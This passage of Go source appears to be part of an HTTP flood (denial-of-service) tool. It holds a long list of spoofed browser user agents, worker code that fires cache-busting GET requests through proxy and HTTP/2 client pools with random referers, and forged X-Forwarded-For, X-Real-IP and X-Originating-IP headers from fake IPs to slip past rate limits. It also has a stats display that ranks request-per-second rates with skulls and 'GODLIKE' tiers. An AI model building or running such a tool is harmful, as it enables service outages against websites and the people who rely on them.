		"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; Hotbar 3.0)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6)",
		"Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607)",
		"Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; )",
		"Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
		"Mozilla/4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint; SCH-i830; PPC; 240x320)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip830w; PPC; 240x320)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i830; PPC; 240x320)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 176x220)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; Hotbar 3.0)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)",
		"Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)",
		"Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)",
		"Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)",
		"Mozilla/4.0 (compatible; MSIE 4.0; Windows 98 )",
		"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)",
		"Mozilla/4.0 (Compatible; MSIE 4.0)",
		"Mozilla/2.0 (compatible; MSIE 4.0; Windows 98)",
		"Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1)",
		"Mozilla/2.0 (compatible; MSIE 3.02; Windows 3.1)",
		"Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
		"Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT)",
		"Mozilla/3.0 (compatible; MSIE 3.0; Windows NT 5.0)",
		"Mozilla/2.0 (compatible; MSIE 3.0; Windows 95)",
		"Mozilla/2.0 (compatible; MSIE 3.0; Windows 3.1)",
		"Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
		"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
		"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
		"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
		"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
		"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Vers",
		"Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
		"Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
		"Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
		"Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
		"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
		"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
		"Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
		"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
		"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
		"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
		"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
		"Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
		"Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
		"Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
		"Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
		"Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
		"Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
		"Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
		"Mozilla/5.0 (Linux i686 ; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.70",
		"Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70",
		"Mozilla/5.0 (Windows NT 5.1; U; en-GB; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.61",
		"Mozilla/5.0 (X11; Linux x86_64; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.60",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.60",
		"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.52",
		"Mozilla/5.0 (Windows NT 5.1; U;  ; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.52",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 9.52",
		"Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
		"Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
		"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
		"Mozilla/5.0 (Windows NT 5.1; U; en-GB; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
		"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
		"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.50",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 9.50",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5",
		"Mozilla/5.0 (Windows NT 5.2; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27",
		"Mozilla/5.0 (Windows NT 5.1; U; es-la; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.27",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.27",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; es-la) Opera 9.27",
		"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.26",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.26",
		"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24",
		"Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24",
		"Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.23",
		"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22",
		"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Opera 8.65 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; Sprint:PPC-6700) Opera 8.65 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320)Opera 8.65 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320) Opera 8.65 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [zh-cn]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [nl]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [de]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.65 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC) Opera 8.65 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Opera 8.60 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.60 [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.60 [en]",
		"Mozilla/5.0 (Windows NT 5.1; U; pl) Opera 8.54",
		"Mozilla/5.0 (Windows 98; U; en) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; fr) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; da) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; pl) Opera 8.54",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.54",
		"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.53",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.53",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.53",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en) Opera 8.53",
		"Mozilla/5.0 (X11; Linux i686; U; en) Opera 8.52",
		"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
		"Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.52",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.52",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.52",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.52",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.52",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.52",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en) Opera 8.52",
		"Mozilla/5.0 (Windows NT 5.1; U; ru) Opera 8.51",
		"Mozilla/5.0 (Windows NT 5.1; U; fr) Opera 8.51",
		"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
		"Mozilla/5.0 (Windows ME; U; en) Opera 8.51",
		"Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en) Opera 8.51",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; ru) Opera 8.51",
		"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.51",
		"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
		"Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.50",
		"Mozilla/5.0 (Windows NT 5.0; U; de) Opera 8.50",
	}

	referers := []string{
		"https://www.google.com/",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.youtube.com/",
		"https://www.instagram.com/",
		"https://www.tiktok.com/",
		"https://duckduckgo.com/",
		"",
	}

	clientIndex := 0

	for task := range workChan {
		var client *http.Client
		if len(proxyList) > 0 && rand.Intn(100) < 60 {
			client = clientPool.HTTP1Clients[clientIndex%len(clientPool.HTTP1Clients)]
		} else {
			client = clientPool.HTTP2Clients[clientIndex%len(clientPool.HTTP2Clients)]
		}

		clientIndex++
		extremeRequest(client, baseURL, task, userAgents, referers, workerID)
	}
}

func extremeRequest(client *http.Client, baseURL string, task RequestTask, userAgents, referers []string, workerID int) {
	now := time.Now().UnixNano()
	url := fmt.Sprintf("%s?_=%d&r=%x&id=%d&w=%d&t=%d&cb=%x",
		baseURL,
		now,
		rand.Int63()&0xFFFFF,
		task.ID,
		workerID,
		task.Timestamp,
		rand.Int63()&0xFFFF)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		atomic.AddInt64(&errorRequests, 1)
		return
	}

	req.Header.Set("Cache-Control", "no-cache, must-revalidate")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	if referer := referers[rand.Intn(len(referers))]; referer != "" {
		req.Header.Set("Referer", referer)
	}

	fakeIP := generateFastFakeIP()
	req.Header.Set("X-Forwarded-For", fakeIP)
	req.Header.Set("X-Real-IP", fakeIP)
	req.Header.Set("X-Originating-IP", fakeIP)

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	atomic.AddInt64(&totalRequests, 1)

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&errorRequests, 1)
		return
	}

	resp.Body.Close()
	atomic.AddInt64(&successRequests, 1)
}

func generateFastFakeIP() string {
	a := 1 + rand.Intn(223)
	b := rand.Intn(256)
	c := rand.Intn(256)
	d := 1 + rand.Intn(254)
	return fmt.Sprintf("%d.%d.%d.%d", a, b, c, d)
}

func printAdvancedStats() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var lastTotal, lastSuccess, lastError int64
	var maxRPS, minRPS int64 = 0, 999999999
	var rpsHistory []int64

	for range ticker.C {
		currentTotal := atomic.LoadInt64(&totalRequests)
		currentSuccess := atomic.LoadInt64(&successRequests)
		currentErrors := atomic.LoadInt64(&errorRequests)

		rps := currentTotal - lastTotal
		successRPS := currentSuccess - lastSuccess
		errorRPS := currentErrors - lastError

		_ = successRPS
		_ = errorRPS

		lastTotal = currentTotal
		lastSuccess = currentSuccess
		lastError = currentErrors

		if rps > maxRPS {
			maxRPS = rps
		}
		if rps < minRPS && rps > 0 {
			minRPS = rps
		}

		rpsHistory = append(rpsHistory, rps)
		if len(rpsHistory) > 60 {
			rpsHistory = rpsHistory[1:]
		}

		elapsed := time.Since(startTime).Seconds()
		avgRPS := float64(currentTotal) / elapsed

		successRate := float64(0)
		if currentTotal > 0 {
			successRate = float64(currentSuccess) / float64(currentTotal) * 100
		}

		stability := calculateStability(rpsHistory)

		status := getPerformanceStatus(rps, stability)

		proxyStatus := ""
		if len(proxyList) > 0 {
			activeProxies := getActiveProxyCount()
			proxyStatus = fmt.Sprintf(" | 📡:%d", activeProxies)
		}

		fmt.Printf("%s [%6.1fs] Total:%9d | ✅:%8d | ❌:%6d | rps:%7d | avg:%8.0f | rate:%5.1f%% | stab:%5.1f%%%s\n",
			status, elapsed, currentTotal, currentSuccess, currentErrors, rps, avgRPS, successRate, stability, proxyStatus)

		if successRate < 95 && currentTotal > 1000 {
			fmt.Printf("⚠️  WARNING: Low success rate (%.1f%%) - consider reducing RPS\n", successRate)
		}
	}
}

func calculateStability(history []int64) float64 {
	if len(history) < 2 {
		return 100.0
	}

	var sum, mean float64
	for _, v := range history {
		sum += float64(v)
	}
	mean = sum / float64(len(history))

	var variance float64
	for _, v := range history {
		variance += (float64(v) - mean) * (float64(v) - mean)
	}
	variance /= float64(len(history))

	if mean == 0 {
		return 100.0
	}

	stability := 100.0 - (variance/mean)*10
	if stability < 0 {
		stability = 0
	}
	if stability > 100 {
		stability = 100
	}

	return stability
}

func getPerformanceStatus(rps int64, stability float64) string {
	if rps > 100000 && stability > 80 {
		return "💀💀💀"
	} else if rps > 50000 && stability > 70 {
		return "💀💀"
	} else if rps > 20000 && stability > 60 {
		return "💀"
	} else if rps > 10000 {
		return "🚀"
	} else if rps > 1000 {
		return "🤑"
	} else {
		return "🐌"
	}
}

func getActiveProxyCount() int {
	if len(proxyList) > 1000 {
		return len(proxyList) / 10
	}
	return len(proxyList)
}

func printFinalStats() {
	fmt.Println(strings.Repeat("=", 85))
	fmt.Println("🎯 FINAL STAT🎯")

	elapsed := time.Since(startTime).Seconds()
	totalReq := atomic.LoadInt64(&totalRequests)
	successReq := atomic.LoadInt64(&successRequests)
	errorReq := atomic.LoadInt64(&errorRequests)

	avgRPS := float64(totalReq) / elapsed
	successRate := float64(successReq) / float64(totalReq) * 100
	errorRate := float64(errorReq) / float64(totalReq) * 100

	fmt.Printf("🕐 Total Duration: %.2f seconds\n", elapsed)
	fmt.Printf("📊 Total Requests: %d\n", totalReq)
	fmt.Printf("✅ Successful: %d (%.2f%%)\n", successReq, successRate)
	fmt.Printf("❌ Failed: %d (%.2f%%)\n", errorReq, errorRate)
	fmt.Printf("⚡ Average RPS: %.0f\n", avgRPS)
	fmt.Printf("🖥️  Efficiency: %.0f req/core/sec\n", avgRPS/float64(runtime.NumCPU()))
	fmt.Printf("📡 Proxies Used: %d\n", len(proxyList))
	fmt.Printf("🧵 Goroutines: %d\n", runtime.NumGoroutine())

	if avgRPS > 200000 && successRate > 95 {
		fmt.Println("👑 GODLIKE PERFORMANCE! LEGENDARY TIER! 200K+ RPS!")
	} else if avgRPS > 100000 && successRate > 90 {
		fmt.Println("🏆 MYTHICAL PERFORMANCE! ULTRA TIER! 100K+ RPS!")
	} else if avgRPS > 50000 && successRate > 85 {
		fmt.Println("🥇 LEGENDARY PERFORMANCE! EPIC TIER! 50K+ RPS!")
	} else if avgRPS > 20000 && successRate > 80 {
		fmt.Println("🥈 EXCELLENT PERFORMANCE! RARE TIER! 20K+ RPS!")
	} else if avgRPS > 10000 {
		fmt.Println("🥉 GREAT PERFORMANCE! COMMON TIER! 10K+ RPS!")
	} else {
		fmt.Println("📈 GOOD START! ROOM FOR OPTIMIZATION!")
	}

	fmt.Println(strings.Repeat("=", 85))
}